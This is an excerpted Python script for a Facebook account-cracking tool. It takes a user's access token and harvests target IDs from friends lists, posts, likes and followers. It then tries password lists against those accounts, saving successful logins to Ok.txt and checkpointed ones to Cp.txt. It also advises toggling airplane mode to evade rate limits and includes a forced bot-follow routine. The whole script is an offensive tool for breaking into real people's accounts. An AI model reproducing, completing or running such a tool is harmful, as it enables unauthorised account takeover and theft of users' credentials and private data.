...
bulan_ = ['January', 'Feburary', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
...
def banner():
 ...
 [\x1b[1;96m+%s] Author   : Op MSA

 [\x1b[1;96m+%s] Github   : -

 [\x1b[1;96m+%s] Facebook : M Saoud
...
class login:
	...
	def __login__(self):
		...
		token = input(' [%s*%s] Enter token : '%(O,N))
		...
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] Login bersonu %s'%(H,N,cc))

				self.bot()

			except KeyError:

				jalan(' [%s!%s] Token error coba Change MSA tumbal!'%(M,N))
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			...
			os.system('xdg-open wa.me/03038689060');exit()
	...
	def bot(self):
		...
		# HARGAI SEDIKIT AJA JANGAN Change BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
		...
		try:
			...
			jalan('\n [%s!%s] Token mokad Change MSA!'%(M,N));time.sleep(1);login().__login__()
		...
		os.system('xdg-open wa.me/03038689060')
...
class menu:
	...
	def main(self):
		...
		print(' %s[%s•%s] You are logged in         : %s'%(N,O,N,waktu))

		print(' %s'%(N))

		print(' %s[%s0%s] crack from friends list'%(N,O,N))

		print(' %s[%s1%s] crack from public id'%(N,O,N))

		print(' %s[%s2%s] crack of mass id'%(N,O,N))

		print(' %s[%s3%s] crack from post'%(N,O,N))

		print(' %s[%s4%s] crack from likes post'%(N,O,N))

		print(' %s[%s5%s] crack from followers'%(N,O,N))

		print(' %s[%s6%s] check id checkpoint option'%(N,O,N))

		print(' %s[%s7%s] check end crack ok,cp'%(N,O,N))
		...
		print(' %s[%sA%s] Exit, delete token'%(N,O,N))
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			print(' %s[%s!%s] Don't empty gold'%(N,M,N));time.sleep(2);menu().main()
			...
			try:
				...
				exit(' %s[%s!%s] check token kamu'%(N,M,N))
			...
			try:
				...
				print(' %s[%s!%s] you are not public...'%(N,M,N));time.sleep(2);menu().main()
			...
			try:
				...
				exit(' %s[%s!%s] Try restarting !'%(N,M,N))

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Enter id : '%(N,O,N))
			...
			for ikeh in range(pler):
				...
				try:
					...
					idt = input(' %s[%s•%s] Enter id yang ke %s : '%(N,O,N,ikeh))
			...
			print(' %s[%s•%s] Enter -> Cp.txt as file'%(N,O,N))

			files = input(' %s[%s•%s] Enter files : '%(N,O,N))
			...
			try:
				...
				exit("\n%s [%s!%s] Files %s%s%s There isn't any!"%(N,M,N,H,files,N))
			...
			exit("\n%s [%s!%s] Done Yes Dog"%(N,M,N))

		elif usna in ['7','07']:

			print(' %s '%(N))

			print(' %s [%s1%s] check sonu ok'%(N,O,N))

			print(' %s [%s2%s] check sonu cp'%(N,O,N))
			...
			if hsl in ['1','01']:
				...
				sonu_ok = open('Ok.txt','r').read()

				if len(sonu_ok) != 0:

					print('\n')

					print('%s[ %ssonu OK %s]'%(N,H,N))

					os.system('cat Ok.txt');exit()

				else:

					print(' %s [%s!%s] You don't get OK :('%(N,O,N))

			elif hsl in ['2','02']:

				sonu_cp = open('Cp.txt','r').read()

				if len(sonu_cp) != 0:

					print('\n')

					print(' %s[ %ssonu CP you %s]'%(N,K,N))
			...
			if pwk in ['1','01']:
				...
				ua = input(' %s [%s+%s] Enter new ua : '%(N,O,N))
				...
				try:
					...
					print(' %s [%s!%s] Success to replace money : %s'%(N,O,N,ua));time.sleep(4);menu().main()
			...
			domain = input(' %s [%s+%s] Enter domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()
			...
			jml = int(input(' %s [%s+%s] Amount target : '%(N,O,N)))

			pwx = input(' %s [%s+%s] Enter password : '%(N,O,N)).split(',')

			print(' %s [%s+%s] Crack is starting'%(N,O,N))
			...
			exit('%s [%s!%s] Crack has been completed'%(N,O,N))
			...
			kata = input(' %s [%s!%s] Enter pesan kamu ke admin : %s'%(N,O,N,H))

			url_wa = ("https://api.whatsapp.com/+923038689060?phone="+nom_wa+"&text="+kata)
...
def khamdihi(user, pasw):
	...
	if "c_user" in ses.cookies:
		...
		print(" • MSA Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
...
class crack:
	...
	def fbeh(self,id):
		...
		if kham in ['']:
			...
			print(' %s[%s!%s] Use koma untuk pemisahan cnth : sayang,katasandi'%(N,O,N))

			while True:

				pw = input(' %s[%s•%s] Enter password : '%(N,O,N))
				...
				if pw in ['']:
					...
					def manual(xnxx=None):
						...
						if mani in ['']:
							...
							print(' %s [%s!%s] Don't empty the dog'%(N,M,N));self.manual()

						elif mani in ['1','01']:

							print(' %s '%(N))

							print('  [%s*%s] MSA Ok will be saved in the file  : Ok.txt'%(O,N))

							print('  [%s*%s] MSA CP will be saved in the file : Cp.txt\n'%(O,N))
							...
							print(' %s [%s*%s] MSA OK will be saved in the file  : Ok.txt'%(N,O,N))

							print(' %s [%s*%s] MSA CP will be saved in the file  : Cp.txt\n'%(N,O,N))
					...
					print(' %s [%s3%s] Method Mobile/M'%(N,O,N))
			...
			print(' %s [%s3%s] Method Mobile/Rekomend'%(N,O,N))
	...
	def otomatis(self):
		...
		oto = input(' %s [%s+%s] Crack dengan Method : '%(N,O,N))
	...
	def free(self):
		...
		print(' %s [%s*%s] MSA ok will be saved in the file   : sonu/OK.txt'%(N,O,N))

		print(' %s [%s*%s] MSA cp will be saved in the file : sonu/CP.txt\n'%(N,O,N))
	...
	def basic(self):
		...
		print(' %s [%s*%s] MSA CP will be saved in the file  : Cp.txt'%(N,O,N))

		print(' %s [%s!%s] Airplane mode 2 seconds if no sonu\n'%(N,O,N))
	...
	def mobilez(self):
		...
		print(' %s [%s*%s] MSA OK akan di simpan di file : Ok.txt'%(N,O,N))

		print(' %s [%s*%s] MSA CP akan di simpan di file : Cp.txt'%(N,O,N))

		print(' %s [%s!%s] mode pesawat 2 detik jika tidak ada sonu\n'%(N,O,N))
